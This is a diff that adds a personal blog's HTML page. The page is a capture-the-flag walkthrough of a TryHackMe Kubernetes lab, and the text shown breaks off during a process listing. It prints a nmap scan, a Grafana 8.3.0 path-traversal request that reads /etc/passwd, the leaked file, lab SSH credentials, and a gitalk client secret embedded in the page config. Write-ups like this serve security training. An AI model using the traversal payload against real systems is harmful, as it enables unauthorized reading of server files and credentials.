@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="jerem1ah">
+    
+    <title>
+        
+            k8s target machine |
+        
+        Jerem1ah&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
+    
+<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/brands.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","favicon":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","avatar":"/images/imgs/50ac4ec68298791a5339fb793e82115.jpg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":false,"preload":false},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":"Lejeremiah","github_admins":null,"repository":"gitalk","client_id":"a415960e8a19902e98bf","client_secret":"97151a67ce9c95ad3c333c402f4cee0f5f05020f"},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":false,"wordcount":false,"min2read":false},"img_align":"left","copyright_info":false},"version":"3.5.2"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Jerem1ah&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">k8s target machine</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/imgs/50ac4ec68298791a5339fb793e82115.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">jerem1ah</span>
+                            
+                                <span class="author-label">Lv4</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-12-14 01:42:01</span>
+        <span class="mobile">2023-12-14 01:42</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-12-14 01:46:46</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pentest/">pentest</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                <h1 id="K8s-Target-Machine"><a href="#K8s-Target-Machine" class="headerlink" title="K8s Target Machine"></a>K8s Target Machine</h1><p><a class="link"   target="_blank" rel="noopener" href="https://tryhackme.com/hacktivities?tab=search&amp;page=1&amp;free=all&amp;order=most-popular&amp;difficulty=all&amp;type=all&amp;searchTxt=Kubernetes" >https://tryhackme.com/hacktivities?tab=search&amp;page=1&amp;free=all&amp;order=most-popular&amp;difficulty=all&amp;type=all&amp;searchTxt=Kubernetes<i class="fas fa-external-link-alt"></i></a> &#x2F;&#x2F;tryhackme</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/17239100.html" >https://www.cnblogs.com/yokan/p/17239100.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://exp10it.cn/2023/04/tryhackme-k8s-%E9%9D%B6%E6%9C%BA-writeup/#kubernetes-for-everyone" >https://exp10it.cn/2023/04/tryhackme-k8s-%E9%9D%B6%E6%9C%BA-writeup/#kubernetes-for-everyone<i class="fas fa-external-link-alt"></i></a> &#x2F;&#x2F;writeup</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/kubernetes/kubectl" >https://github.com/kubernetes/kubectl<i class="fas fa-external-link-alt"></i></a> &#x2F;&#x2F;kubectl</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux" >https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux<i class="fas fa-external-link-alt"></i></a> &#x2F;&#x2F;kubectl binary</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK" >https://github.com/cdk-team/CDK<i class="fas fa-external-link-alt"></i></a> &#x2F;&#x2F;cdk</p>
+<h3 id="Kubernetes-for-Everyone"><a href="#Kubernetes-for-Everyone" class="headerlink" title="Kubernetes for Everyone"></a>Kubernetes for Everyone</h3><p>Task1: Access the Cluster</p>
+<p>To access a cluster, you need to know the location of the K8s cluster and have credentials to access it. Compromise the cluster and best of luck.Use Nmap to find open ports and gain a foothold by exploiting a vulnerable service. If you are new at Nmap, take a look at the <a class="link"   target="_blank" rel="noopener" href="https://tryhackme.com/room/furthernmap" >Nmap room<i class="fas fa-external-link-alt"></i></a>.</p>
+<p>Task2: Your Secret Crush</p>
+<p>If you want to keep a secret, you must also hide it from yourself. Find the secret!</p>
+<p>Scan IP with fscan or nmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap 10.10.239.222  </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-06 08:57 EST</span><br><span class="line">Nmap scan report for bogon (10.10.239.222)</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 996 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">3000/tcp open  ppp</span><br><span class="line">5000/tcp open  upnp</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.06 seconds</span><br></pre></td></tr></table></figure>
+
+<p>Port 3000 is the Grafana application. version 8.3.0 with Arbitrary file read vulnerability</p>
+<p>the network is so slow.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /public/plugins/gettingstarted/../../../../../../../../../../../../../../../etc/passwd HTTP/1.1</span><br><span class="line">Host: 10.10.239.222:3000</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: redirect_to=%2F</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Content-Length: 1231</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">Expires: -1</span><br><span class="line">Last-Modified: Tue, 08 Feb 2022 11:40:05 GMT</span><br><span class="line">Pragma: no-cache</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-Frame-Options: deny</span><br><span class="line">X-Xss-Protection: 1; mode=block</span><br><span class="line">Date: Wed, 06 Dec 2023 15:06:17 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/ash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/mail:/sbin/nologin</span><br><span class="line">news:x:9:13:news:/usr/lib/news:/sbin/nologin</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">man:x:13:15:man:/usr/man:/sbin/nologin</span><br><span class="line">postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin</span><br><span class="line">cron:x:16:16:cron:/var/spool/cron:/sbin/nologin</span><br><span class="line">ftp:x:21:21::/var/lib/ftp:/sbin/nologin</span><br><span class="line">sshd:x:22:22:sshd:/dev/null:/sbin/nologin</span><br><span class="line">at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin</span><br><span class="line">squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin</span><br><span class="line">xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin</span><br><span class="line">games:x:35:35:games:/usr/games:/sbin/nologin</span><br><span class="line">cyrus:x:85:12::/usr/cyrus:/sbin/nologin</span><br><span class="line">vpopmail:x:89:89::/var/vpopmail:/sbin/nologin</span><br><span class="line">ntp:x:123:123:NTP:/var/empty:/sbin/nologin</span><br><span class="line">smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin</span><br><span class="line">guest:x:405:100:guest:/dev/null:/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/:/sbin/nologin</span><br><span class="line">grafana:x:472:0:hereiamatctf907:/home/grafana:/sbin/nologin</span><br></pre></td></tr></table></figure>
+
+<p>then, Port 5000, find the account in the static file &#x2F;static&#x2F;css&#x2F;main.css</p>
+<p>visit this url, we get OZQWO4TBNZ2A&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* @import url(&quot;https://pastebin.com/cPs69B0y&quot;); */</span><br><span class="line">OZQWO4TBNZ2A====</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vagrant/hereiamatctf907</span><br></pre></td></tr></table></figure>
+
+<p>login via ssh with this account, ps aux to view process information</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">vagrant@johnny:/$ ps aux</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                 </span><br><span class="line">root         1  0.6  0.1 225276   572 ?        Ss   13:35   0:43 /sbin/init                                                                              </span><br><span class="line">root         2  0.0  0.0      0     0 ?        S    13:35   0:00 [kthreadd]                                                                              </span><br><span class="line">root         4  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [kworker/0:0H]                                                                          </span><br><span class="line">root         5  0.0  0.0      0     0 ?        I    13:35   0:02 [kworker/u30:0]                                                                         </span><br><span class="line">root         6  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [mm_percpu_wq]                                                                          </span><br><span class="line">root         7  0.0  0.0      0     0 ?        S    13:35   0:05 [ksoftirqd/0]                                                                           </span><br><span class="line">root         8  0.0  0.0      0     0 ?        I    13:35   0:05 [rcu_sched]                                                                             </span><br><span class="line">root         9  0.0  0.0      0     0 ?        I    13:35   0:00 [rcu_bh]                                                                                </span><br><span class="line">root        10  0.0  0.0      0     0 ?        S    13:35   0:00 [migration/0]                                                                           </span><br><span class="line">root        11  0.0  0.0      0     0 ?        S    13:35   0:00 [watchdog/0]                                                                            </span><br><span class="line">root        12  0.0  0.0      0     0 ?        S    13:35   0:00 [cpuhp/0]                                                                               </span><br><span class="line">root        13  0.0  0.0      0     0 ?        S    13:35   0:00 [kdevtmpfs]                                                                             </span><br><span class="line">root        14  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [netns]                                                                                 </span><br><span class="line">root        15  0.0  0.0      0     0 ?        S    13:35   0:00 [rcu_tasks_kthre]                                                                       </span><br><span class="line">root        16  0.0  0.0      0     0 ?        S    13:35   0:00 [kauditd]                                                                               </span><br><span class="line">root        17  0.0  0.0      0     0 ?        S    13:35   0:00 [xenbus]                                                                                </span><br><span class="line">root        18  0.0  0.0      0     0 ?        S    13:35   0:00 [xenwatch]                                                                              </span><br><span class="line">root        19  0.0  0.0      0     0 ?        I    13:35   0:00 [kworker/0:1]                                                                           </span><br><span class="line">root        20  0.0  0.0      0     0 ?        S    13:35   0:00 [khungtaskd]                                                                            </span><br><span class="line">root        21  0.0  0.0      0     0 ?        S    13:35   0:00 [oom_reaper]                                                                            </span><br><span class="line">root        22  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [writeback]                                                                             </span><br><span class="line">root        23  0.0  0.0      0     0 ?        S    13:35   0:00 [kcompactd0]                                                                            </span><br><span class="line">root        24  0.0  0.0      0     0 ?        SN   13:35   0:00 [ksmd]                                                                                  </span><br><span class="line">root        25  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [crypto]                                                                                </span><br><span class="line">root        26  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [kintegrityd]                                                                           </span><br><span class="line">root        27  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [kblockd]                                                                               </span><br><span class="line">root        28  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [ata_sff]                                                                               </span><br><span class="line">root        29  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [md]                                                                                    </span><br><span class="line">root        30  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [edac-poller]                                                                           </span><br><span class="line">root        31  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [devfreq_wq]                                                                            </span><br><span class="line">root        32  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [watchdogd]                                                                             </span><br><span class="line">root        35 18.3  0.0      0     0 ?        R    13:35  19:20 [kswapd0]</span><br><span class="line">root        36  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [kworker/u31:0]</span><br><span class="line">root        37  0.0  0.0      0     0 ?        S    13:35   0:00 [ecryptfs-kthrea]</span><br><span class="line">root        79  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [kthrotld]</span><br><span class="line">root        80  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [acpi_thermal_pm]</span><br><span class="line">root        81  0.0  0.0      0     0 ?        S    13:35   0:00 [scsi_eh_0]</span><br><span class="line">root        82  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [scsi_tmf_0]</span><br><span class="line">root        83  0.0  0.0      0     0 ?        S    13:35   0:00 [scsi_eh_1]</span><br><span class="line">root        84  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [scsi_tmf_1]</span><br><span class="line">root        85  0.0  0.0      0     0 ?        R    13:35   0:01 [kworker/u30:2]</span><br><span class="line">root        90  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [ipv6_addrconf]</span><br><span class="line">root        96  0.0  0.0      0     0 ?        I    13:35   0:03 [kworker/u30:4]</span><br><span class="line">root       100  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [kstrp]</span><br><span class="line">root       114  1.2  0.0      0     0 ?        I&lt;   13:35   1:22 [kworker/0:1H]</span><br><span class="line">root       118  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [charger_manager]</span><br><span class="line">root       174  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [ttm_swap]</span><br><span class="line">root       263  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [raid5wq]</span><br><span class="line">root       289  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [kdmflush]</span><br><span class="line">root       290  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [bioset]</span><br><span class="line">root       298  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [kdmflush]</span><br><span class="line">root       299  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [bioset]</span><br><span class="line">root       346  0.0  0.0      0     0 ?        S    13:35   0:02 [jbd2/dm-0-8]</span><br><span class="line">root       347  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [ext4-rsv-conver]</span><br><span class="line">root       404  2.0  0.1 111188   624 ?        R&lt;s  13:35   2:11 /lib/systemd/systemd-journald</span><br><span class="line">root       413  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [iscsi_eh]</span><br><span class="line">root       415  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [rpciod]</span><br><span class="line">root       416  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [xprtiod]</span><br><span class="line">root       417  0.0  0.0 105904     0 ?        Ss   13:35   0:00 /sbin/lvmetad -f</span><br><span class="line">root       418  0.1  0.0  45980    76 ?        Ss   13:35   0:08 /lib/systemd/systemd-udevd</span><br><span class="line">root       421  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [ib-comp-wq]</span><br><span class="line">root       422  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [ib_mcast]</span><br><span class="line">root       423  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [ib_nl_sa_wq]</span><br><span class="line">root       424  0.0  0.0      0     0 ?        I&lt;   13:35   0:00 [rdma_cm]</span><br><span class="line">systemd+   455  0.0  0.0  80168   124 ?        Ss   13:36   0:02 /lib/systemd/systemd-networkd</span><br><span class="line">systemd+   497  0.0  0.0  70628    84 ?        Ss   13:36   0:01 /lib/systemd/systemd-resolved</span><br><span class="line">root       498  0.0  0.0  47600    68 ?        Ss   13:36   0:00 /sbin/rpcbind -f -w</span><br><span class="line">root       623  0.0  0.0  95540     0 ?        Ssl  13:36   0:00 /usr/bin/lxcfs /var/lib/lxcfs/</span><br><span class="line">message+   624  0.0  0.0  50104   328 ?        Ss   13:36   0:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activati</span><br><span class="line">syslog     635  0.2  0.0 267272    96 ?        Ssl  13:36   0:15 /usr/sbin/rsyslogd -n</span><br><span class="line">daemon     645  0.0  0.0  28332    32 ?        Ss   13:36   0:00 /usr/sbin/atd -f</span><br><span class="line">root       646  0.0  0.1  70604   688 ?        Ss   13:36   0:01 /lib/systemd/systemd-logind</span><br><span class="line">root       648  0.9  0.7 1232940 3568 ?        Ssl  13:36   0:59 /usr/bin/amazon-ssm-agent</span><br><span class="line">root       650  0.0  0.0 170440    56 ?        Ssl  13:36   0:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers</span><br><span class="line">root       651  0.0  0.0  31320   376 ?        Ss   13:36   0:01 /usr/sbin/cron -f</span><br><span class="line">root       653  0.0  0.0 287536    72 ?        Ssl  13:36   0:05 /usr/lib/accountsservice/accounts-daemon</span><br><span class="line">root       679  1.7  0.7 1277280 3844 ?        Ssl  13:36   1:49 /usr/bin/containerd</span><br><span class="line">root       684  0.0  0.0  15956    28 ttyS0    Ss+  13:36   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220</span><br><span class="line">root       686  0.0  0.0  16180    20 tty1     Ss+  13:36   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux</span><br><span class="line">root       704  0.0  0.0  72296     0 ?        Ss   13:36   0:00 /usr/sbin/sshd -D</span><br><span class="line">root       708  0.0  0.0 291456   340 ?        Ssl  13:36   0:00 /usr/lib/policykit-1/polkitd --no-debug</span><br><span class="line">root       753  0.9  0.7 1170504 3680 ?        Sl   13:36   1:00 /usr/bin/ssm-agent-worker</span><br><span class="line">root       776  2.4  0.2 1447128 1216 ?        Ssl  13:36   2:32 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock</span><br><span class="line">root      1005  0.0  0.0 1005440    0 ?        Sl   13:37   0:01 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0</span><br><span class="line">root      1011  0.0  0.0 1005440   24 ?        Sl   13:37   0:01 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -c</span><br><span class="line">root      1024  0.0  0.0 1005440    0 ?        Sl   13:37   0:01 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.17.0</span><br><span class="line">root      1028  0.0  0.0 1005440    0 ?        Sl   13:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 5000 -container-ip 172.17.0.3 -c</span><br><span class="line">root      1107  0.3  0.3 712596  1676 ?        Sl   13:37   0:21 /usr/bin/containerd-shim-runc-v2 -namespace moby -id e7c06a854957fdc4f49e721a5e295c7acd2</span><br><span class="line">root      1121  0.2  0.3 712852  1792 ?        Sl   13:37   0:16 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 54c2fca370f68b4fdb5d163e8835286c19c</span><br><span class="line">vagrant   1158  0.3  0.0  28532    48 pts/0    Ss+  13:37   0:20 python3 main.py</span><br><span class="line">472       1161  6.6  1.4 786624  7316 pts/0    Ssl+ 13:37   6:49 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packagi</span><br><span class="line">vagrant   1291 20.7  0.9  29744  4884 pts/0    Dl+  13:39  21:03 /usr/local/bin/python3 /home/pyuser/main.py</span><br><span class="line">kube-ap+  1298  0.9  1.5 725628  7484 ?        Sl   13:39   0:58 /var/lib/k0s/bin/kine --endpoint=sqlite:///var/lib/k0s/db/state.db?more=rwc&amp;_journal=WAL</span><br><span class="line">root      1330  0.0  0.0      0     0 ?        I    13:41   0:05 [kworker/0:0]</span><br><span class="line">root      1355  5.4  3.9 787240 19468 ?        Ssl  13:44   5:16 /usr/local/bin/k0s controller --single=true</span><br><span class="line">kube-ap+  1363  3.7  4.0 728096 19828 ?        Sl   13:45   3:36 /var/lib/k0s/bin/kine --endpoint=sqlite:///var/lib/k0s/db/state.db?more=rwc&amp;_journal=WAL</span><br><span class="line">kube-ap+  1372  8.4 42.8 985868 210572 ?       Sl   13:45   8:05 /var/lib/k0s/bin/kube-apiserver --requestheader-username-headers=X-Remote-User --anonymo</span><br><span class="line">kube-sc+  1411  4.8  2.4 753784 12132 ?        Sl   13:45   4:36 /var/lib/k0s/bin/kube-scheduler --authorization-kubeconfig=/var/lib/k0s/pki/scheduler.co</span><br><span class="line">kube-ap+  1626  6.9  2.7 766848 13716 ?        Rl   15:14   0:28 /var/lib/k0s/bin/kube-controller-manager --authentication-kubeconfig=/var/lib/k0s/pki/cc</span><br><span class="line">vagrant   1636  0.3  0.0  76772     0 ?        Ss   15:15   0:01 